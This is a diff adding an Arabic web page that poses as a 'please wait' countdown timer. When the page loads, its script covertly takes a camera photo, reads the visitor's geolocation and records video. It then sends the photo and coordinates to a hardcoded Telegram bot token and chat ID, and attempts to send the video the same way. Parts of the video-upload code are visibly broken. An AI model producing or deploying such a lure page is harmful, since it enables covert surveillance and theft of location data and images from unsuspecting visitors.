@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عداد تنازلي</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            direction: rtl;
+        }
+        #countdown {
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        #waitMessage {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        #circle {
+            width: 200px;
+            height: 200px;
+            border: 10px solid #3498db;
+            border-radius: 50%;
+            position: relative;
+            overflow: hidden;
+        }
+        #filler {
+            width: 100%;
+            height: 100%;
+            background-color: #3498db;
+            position: absolute;
+            top: 0;
+            left: 0;
+            transform-origin: bottom;
+            transition: transform 1s linear;
+        }
+    </style>
+</head>
+<body>
+    <div id="waitMessage">يرجى الانتظار...</div>
+    <div id="countdown">10</div>
+    <div id="circle">
+        <div id="filler"></div>
+    </div>
+
+    <script>
+        let count = 10;
+        const countdownElement = document.getElementById('countdown');
+        const filler = document.getElementById('filler');
+        let mediaRecorder;
+        let recordedChunks = [];
+        let stream;
+
+        // بدء تشغيل الكاميرا مباشرة
+        async function startCamera() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                getLocation(stream);
+            } catch (err) {
+                console.error('خطأ في الوصول إلى الكاميرا: ', err);
+            }
+        }
+
+        function getLocation(stream) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const { latitude, longitude } = position.coords;
+                    captureImage(stream, latitude, longitude);
+                }, error => {
+                    console.error('خطأ في الحصول على الموقع: ', error);
+                });
+            } else {
+                console.error('الموقع غير مدعوم في هذا المتصفح.');
+            }
+        }
+
+        function captureImage(stream, latitude, longitude) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            // التقاط صورة وإرسالها إلى تلغرام
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            video.addEventListener('loadedmetadata', () => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+                sendToTelegram(latitude, longitude, imageData, 'صورة');
+
+                // بدء تسجيل الفيديو
+                startRecording();
+            });
+        }
+
+        function startRecording() {
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (event) => {
+                if (event.data.size > 0) {
+                    recordedChunks.push(event.data);
+                }
+            };
+            mediaRecorder.start();
+
+            const countdownInterval = setInterval(() => {
+                countdownElement.textContent = count;
+                filler.style.transform = `scaleY(${count / 10})`;
+                count--;
+
+                if (count < 0) {
+                    clearInterval(countdownInterval);
+                    mediaRecorder.stop();
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            }, 1000);
+        }
+
+        mediaRecorder.onstop = () => {
+            const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+            const videoData = URL.createObjectURL(videoBlob);
+            sendToTelegram('', '', videoData, 'فيديو');
+        };
+
+        function sendToTelegram(lat, long, mediaData, mediaType) {
+            const token = '7892070385:AAHIv9d2i5uGwO-AmbAYjwJK_jT7qm1p93I';
+            const chatId = '6185375878';
+            let message = '';
+
+            if (mediaType === 'صورة') {
+                message = `إحداثيات الموقع:\nLatitude: ${lat}\nLongitude: ${long}`;
+                const apiUrl = `https://api.telegram.org/bot${token}/sendPhoto`;
+                fetch(mediaData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'photo.png');
+                        formData.append('caption', message);
+                        return fetch(apiUrl, { method: 'POST', body: formData });
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('تم إرسال الصورة إلى Telegram:', data);
+                    })
+                    .catch(error => {
+                        console.error('خطأ في إرسال الصورة إلى Telegram: ', error);
+                    });
+            } else if (mediaType === 'فيديو') {
+                message = `تم إرسال الفيديو.`;
+                const apiUrl = `https://api.telegram.org/bot${token}/sendVideo`;
+                fetch(videoData)
+                    .then(res => res.blob())
+                    .then(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('video', blob, 'video.webm');
+                        formData.append('caption', message);
+                        return fetch(apiUrl, { method: 'POST', body: formData });
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('تم إرسال الفيديو إلى Telegram:', data);
+                    })
+                    .catch(error => {
+                        console.error('خطأ في إرسال الفيديو إلى Telegram: ', error);
+                    });
+            }
+        }
+
+        // بدء الكاميرا عند تحميل الصفحة
+        startCamera();
+    </script>
+</body>
+</html>
